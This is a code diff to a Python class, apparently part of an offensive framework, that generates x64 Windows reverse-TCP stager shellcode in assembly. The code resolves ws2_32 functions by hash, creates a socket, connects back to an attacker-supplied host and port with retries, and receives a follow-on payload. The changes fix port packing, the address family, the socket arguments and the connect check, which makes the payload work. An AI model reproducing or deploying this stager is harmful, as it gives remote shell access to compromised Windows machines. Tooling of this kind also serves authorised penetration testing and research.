@@ -129,16 +129,16 @@ class ReverseTCP(BaseMixin):
         """
 
         host = Socket().pack_host(host)
-        port = "{:08x}".format(port)
+        port = Socket().pack_port(port)
 
         block = dedent(f"""\
         reverse_tcp:
             mov  r14, 0x{b'ws2_32'[::-1].hex()}
             push r14
             mov  r14, rsp
-            sub  rsp, 416
+            sub  rsp, 0x01A0
             mov  r13, rsp
-            mov  r12, 0x{host.hex()}{port}
+            mov  r12, 0x{host.hex()}{port.hex()}0002
             push r12
             mov  r12, rsp
             mov  rcx, r14
@@ -160,18 +160,21 @@ class ReverseTCP(BaseMixin):
             xor  r9, r9
             xor  r8, r8
             inc  rax
-            mov  rcx, rax
+            mov  rdx, rax
+            inc rax
+            mov rcx, rax
             mov  r10d, {self.text.block_api_hash('ws2_32.dll', 'WSASocketA')}
             call rbp
             mov  rdi, rax
 
         connect:
-            push 16
+            push 0x10
             pop  r8
             mov  rdx, r12
             mov  rcx, rdi
             mov  r10d, {self.text.block_api_hash('ws2_32.dll', 'connect')}
             call rbp
+            test eax, eax
             jz   success
             dec  r14
             jnz  connect
@@ -211,7 +214,7 @@ class ReverseTCP(BaseMixin):
         else:
             block = dedent(f"""\
             recv:
-                sub  rsp, 16
+                sub  rsp, 0x10
                 mov  rdx, rsp
                 xor  r9, r9
                 push 4
@@ -228,7 +231,7 @@ class ReverseTCP(BaseMixin):
                 """)
 
             block += dedent("""\
-                add rsp, 32
+                add rsp, 0x20
             """)
 
         block += dedent(f"""\
